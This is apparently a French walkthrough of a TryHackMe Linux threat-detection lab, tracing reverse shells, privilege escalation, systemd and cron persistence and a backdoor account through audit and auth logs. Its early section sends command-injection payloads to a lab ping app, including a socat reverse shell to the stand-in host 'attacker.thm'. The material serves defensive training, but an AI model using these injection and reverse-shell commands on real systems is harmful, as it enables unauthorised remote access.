---
title: Linux Threat Detection 3
tags: [TryHackMe, Intermédiaire, Défense, Analyse de logs, Linux]
style: border
color: thm
comments: false
description: Analyser les logs d'une machine Linux pour trouver des traces de compromission
---
Lien vers l'épreuve : <https://tryhackme.com/room/linuxthreatdetection3>

![Medium](https://img.shields.io/badge/Difficulté-Intermédiaire-orange?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Reverse Shells](#reverse-shells)
* [Escalade de privilège](#escalade-de-privilège)
* [Persistence au démarrage](#persistence-au-démarrage)
* [Compte de persistance](#compte-de-persistance)

## Reverse Shells

### Lancer la commande `127.0.0.1 && whoami` sur l'application TryPingMe <!-- omit in toc -->

Quel est la sortie après les résultats du ping ?

{% include elements/figure_spoil.html image="images/THM/20260409/Capture_ecran_2026-04-09_whoami.png" caption="Résultat de la commande whoami" %}

Il est également possible d'utiliser une commande `curl` pour obtenir la réponse.

```bash
curl -X POST "http://10.130.163.105:8000/" --data-urlencode "target=127.0.0.1 && whoami"
```

{% capture spoil %}

```html
<!doctype html>
<html lang="en">

<head>[...expurgé pour brièveté...]</head>
<body>
    <div class="card">
        <h1>TryPingMe</h1>
        <form method="post">
            <input type="text" name="target" placeholder="Enter hostname or IP" required>
            <button type="submit">Ping</button>
        </form>


        <div>
            <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
                64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms
                64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.016 ms
                64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.013 ms
                64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.030 ms

                --- 127.0.0.1 ping statistics ---
                4 packets transmitted, 4 received, 0% packet loss, time 3075ms
                rtt min/avg/max/mdev = 0.013/0.020/0.030/0.006 ms
                [...expurgé...]
            </pre>
        </div>

    </div>
</body>

</html>
```

{% endcapture %}
{% include elements/spoil.html %}

### Lancer un reverse shell imaginaire vers "attacker.thm" <!-- omit in toc -->

{% include elements/figure_spoil.html image="images/THM/20260409/Capture_ecran_2026-04-09_socat.png" caption="Résultat de la commande socat" %}

```bash
curl -X POST "http://10.130.163.105:8000/" --data-urlencode "target=127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh"
```

{% capture spoil %}

```html
<!doctype html>
<html lang="en">

<head>[...expurgé pour brièveté...]</head>
<body>
    <div class="card">
        <h1>TryPingMe</h1>
        <form method="post">
            <input type="text" name="target" placeholder="Enter hostname or IP" required>
            <button type="submit">Ping</button>
        </form>


        <div>
            <pre>
The command you just ran would establish a socat reverse shell!

If you were an attacker, you would first start a listener:
+--------------------------------------------------+
| kali@attacker.thm:~$ nc -lvnp 1337               |
| Listening on 0.0.0.0 1337...                     |
| [...]                                            |
+--------------------------------------------------+

Then, after you run the socat command, you would see:
+--------------------------------------------------+
| [...]                                            |
| New connection from thm-vm!                      |
| Creating a shell for thm-vm...                   |
| Created a shell on the victim!                   |
| svctrypingme@thm-vm:/opt/trypingme# hostname     |
| thm-vm                                           |
+--------------------------------------------------+

Your flag: THM{[...expurgé...]}
</pre>
        </div>

    </div>
</body>

</html>
```

{% endcapture %}
{% include elements/spoil.html %}

### Regarder dans les logs `/home/ubuntu/scenario` <!-- omit in toc -->

Quelle adresse IP à utiliser un {% include dictionary.html word="reverse-shell" %} similaire ?

```bash
ausearch -i -if audit.log -x socat | grep "PROCTITLE"
```

{% capture spoil %}

```txt
type=PROCTITLE msg=audit(09/23/25 14:52:23.512:2126) : proctitle=socat TCP:[...expurgé...]:1337 EXEC:sh,pty,stderr,setsid,sigint,sane 
type=PROCTITLE msg=audit(09/23/25 14:52:23.564:2127) : proctitle=socat TCP:[...expurgé...]:1337 EXEC:sh,pty,stderr,setsid,sigint,sane 
type=PROCTITLE msg=audit(09/23/25 14:52:23.564:2128) : proctitle=socat TCP:[...expurgé...]:1337 EXEC:sh,pty,stderr,setsid,sigint,sane 
type=PROCTITLE msg=audit(09/23/25 14:52:23.565:2129) : proctitle=socat TCP:[...expurgé...]:1337 EXEC:sh,pty,stderr,setsid,sigint,sane
```

{% endcapture %}
{% include elements/spoil.html %}

## Escalade de privilège

### Quelle ligne de commande a été utilisée pour trouver le mot clé "pass" dans les fichiers ?  <!-- omit in toc -->

```bash
ausearch -i -if audit.log | grep "PROCTITLE.*pass"
```

{% capture spoil %}

```txt
type=PROCTITLE msg=audit(09/23/25 14:53:00.821:2134) : proctitle=find . -name *pass* 
type=PROCTITLE msg=audit(09/23/25 14:53:10.724:2136) : proctitle=grep [...expurgé...]
```

{% endcapture %}
{% include elements/spoil.html %}

### Quelle ligne de commande a été utilisée pour escalader les privilèges vers root ? <!-- omit in toc -->

```bash
ausearch -i -if audit.log | grep "PROCTITLE.*root"
```

{% capture spoil %}

```txt
type=PROCTITLE msg=audit(09/23/25 14:53:49.262:2138) : proctitle=[...expurgé...]
```

{% endcapture %}
{% include elements/spoil.html %}

### Regarder dans le fichier `.env` détecté, quel est le mot de passe root ? <!-- omit in toc -->

```bash
ausearch -i -if audit.log | grep "PROCTITLE.*\.env"
```

{% capture spoil %}

```txt
type=PROCTITLE msg=audit(09/23/25 14:53:44.238:2137) : proctitle=cat .env.local
```

{% endcapture %}
{% include elements/spoil.html %}

Le chemin complet du fichier n'est pas enregistré, la commande `find` peut permettre de le retrouver.

```bash
find / -name .env.local -type f -exec cat {} \; 2>/dev/null
```

{% capture spoil %}

```txt
# Run the app from this user
# USER=root
# PASSWORD=[...expurgé...]

# UPD: The file is no longer used, commented it for now
```

{% endcapture %}
{% include elements/spoil.html %}

## Persistence au démarrage

### Quel flag obtient-on en lançant le malware persistant en tant que service ? <!-- omit in toc -->

```bash
ausearch -i -f /etc/systemd | grep "proctitle"
```

{% capture spoil %}

```txt
type=PROCTITLE msg=audit(09/23/25 17:06:42.860:834) : proctitle=nano /etc/systemd/system/tux.service 
type=PROCTITLE msg=audit(09/23/25 17:06:54.825:835) : proctitle=nano /etc/systemd/system/tux.service 
type=PROCTITLE msg=audit(09/23/25 17:07:11.421:836) : proctitle=nano /etc/systemd/system/tux.service 
type=PROCTITLE msg=audit(04/09/26 09:09:24.779:212) : proctitle=wget -O /etc/systemd/system/badr.service https://tryhackme-badr-deployment-production-eu-west-3.s3.eu-west-3.amazonaws.com/badr.
```

{% endcapture %}
{% include elements/spoil.html %}

Le service `tux.service` a été modifié plusieurs fois manuellement. Ce comportement suspect pourrait cacher une méthode de persistance pour un logiciel malveillant.

```bash
cat /etc/systemd/system/tux.service
```

{% capture spoil %}

```yml
[Unit]
Description=Tux Helper Library
Wants=network-online.target
After=network-online.target

[Service]
ExecStart=/var/lib/misc/tux

[Install]
WantedBy=multi-user.target
```

{% endcapture %}
{% include elements/spoil.html %}

Le service exécute un fichier dont le chemin est `/var/lib/misc/tux`.

```bash
bash -c /var/lib/misc/tux
```

{% capture spoil %}

```txt
=========================================
Good job finding me! Where did I persist
Example: /folder/name.service
=========================================
Your answer: /etc/systemd/system/tux.service
THM{[...expurgé...]}
=========================================
Press Enter to exit...
```

{% endcapture %}
{% include elements/spoil.html %}

### Quel flag obtient-on en lançant le malware persistant en tant que tâche planifiée ? <!-- omit in toc -->

```bash
ausearch -i -x crontab
```

{% capture spoil %}

```txt
----
type=PROCTITLE msg=audit(09/23/25 17:07:38.770:837) : proctitle=crontab -e 
type=PATH msg=audit(09/23/25 17:07:38.770:837) : item=1 name=crontabs/tmp.P5H675 inode=564223 dev=103:01 mode=file,600 ouid=root ogid=crontab rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
type=PATH msg=audit(09/23/25 17:07:38.770:837) : item=0 name=crontabs/ inode=517077 dev=103:01 mode=dir,sticky,730 ouid=root ogid=crontab rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
type=CWD msg=audit(09/23/25 17:07:38.770:837) : cwd=/var/spool/cron 
type=SYSCALL msg=audit(09/23/25 17:07:38.770:837) : arch=x86_64 syscall=openat success=yes exit=5 a0=AT_FDCWD a1=0x5d5f36f771c0 a2=O_RDWR|O_CREAT|O_EXCL a3=0x180 items=2 ppid=1265 pid=1311 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=crontab sgid=crontab fsgid=crontab tty=pts1 ses=8 comm=crontab exe=/usr/bin/crontab subj=unconfined key=cron
```

{% endcapture %}
{% include elements/spoil.html %}

La crontab de la machine a été modifiée le même jour que la création du service malveillant.

```bash
crontab -l
```

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
@reboot /usr/sbin/phoenix
```

{% endcapture %}
{% include elements/spoil.html %}

Une tâche est planifiée après chaque redémarrage de la machine. L'exécutable se trouve au chemin `/usr/sbin/phoenix`.

Le fichier modifié par la commande `crontab -e` semble localisé dans le dossier `/var/spool/cron` référencé par les lettres CWD (*Current Working Directory* : Dossier de Travail Actuel)

```bash
ls -hlR /var/spool/cron
```

{% capture spoil %}

```txt
/var/spool/cron/:
total 12
drwxr-xr-x 3 root root    4096 Oct 22  2024 ./
drwxr-xr-x 4 root root    4096 Oct 22  2024 ../
drwx-wx--T 2 root crontab 4096 Sep 23  2025 crontabs/

/var/spool/cron/crontabs:
total 12
drwx-wx--T 2 root crontab 4096 Sep 23  2025 ./
drwxr-xr-x 3 root root    4096 Oct 22  2024 ../
-rw------- 1 root crontab 1015 Sep 23  2025 root
```

{% endcapture %}
{% include elements/spoil.html %}

Il y a un seul et unique fichier "root".

```bash
cat /var/spool/cron/crontabs/root
```

{% capture spoil %}

```txt
[...expurgé pour brièveté...]
@reboot /usr/sbin/phoenix
```

{% endcapture %}
{% include elements/spoil.html %}

Ces informations correspondent bien à ce qui a été trouvé avec la commande `crontab -l`.

```bash
bash -c /usr/sbin/phoenix
```

{% capture spoil %}

```txt
=========================================
Good job finding me! Where did I persist
Example: /folder/cronfile
=========================================
Your answer: /var/spool/cron/crontabs/root
THM{[...expurgé...]}
=========================================
Press Enter to exit...
```

{% endcapture %}
{% include elements/spoil.html %}

## Compte de persistance

### Quel utilisateur a été créé et ajouté au groupe sudo ? <!-- omit in toc -->

```bash
grep -E "useradd|usermod" /var/log/auth.log
```

{% capture spoil %}

```txt
2025-09-23T17:08:57.066900+00:00 thm-vm useradd[1323]: new group: name=[...expurgé...], GID=1002
2025-09-23T17:08:57.070626+00:00 thm-vm useradd[1323]: new user: name=[...expurgé...], UID=1002, GID=1002, home=/home/[...expurgé...], shell=/bin/bash, from=/dev/pts/1
2025-09-23T17:09:46.339328+00:00 thm-vm usermod[1331]: add '[...expurgé...]' to group 'sudo'
2025-09-23T17:09:46.339656+00:00 thm-vm usermod[1331]: add '[...expurgé...]' to shadow group 'sudo'
```

{% endcapture %}
{% include elements/spoil.html %}

### Quel fichier a été modifié pour  autorisé une persistance par clé SSH ? <!-- omit in toc -->

Le fichier autorisant les utilisateurs connus à se connecter avec une clé SSH est `authorized_keys`

```bash
ausearch -i -f authorized_keys
```

{% capture spoil %}

```txt
----
type=PROCTITLE msg=audit(09/23/25 17:08:26.870:838) : proctitle=bash
type=PATH msg=audit(09/23/25 17:08:26.870:838) : item=0 name=/[...expurgé...]/authorized_keys inode=256095 dev=103:01 mode=file,600 ouid=root ogid=root rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0
type=CWD msg=audit(09/23/25 17:08:26.870:838) : cwd=/root
type=SYSCALL msg=audit(09/23/25 17:08:26.870:838) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x5a843f9e03d0 a2=O_WRONLY|O_CREAT|O_APPEND a3=0x1b6 items=1 ppid=1264 pid=1265 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=8 comm=bash exe=/usr/bin/bash subj=unconfined key=ssh
[...expurgé pour brièveté...]
```

{% endcapture %}
{% include elements/spoil.html %}

Un processus bash semble avoir fait appel à un fichier `authorized_keys`, mais il n'est pas possible de récupéré les détails du processus dont le PID est 1264.
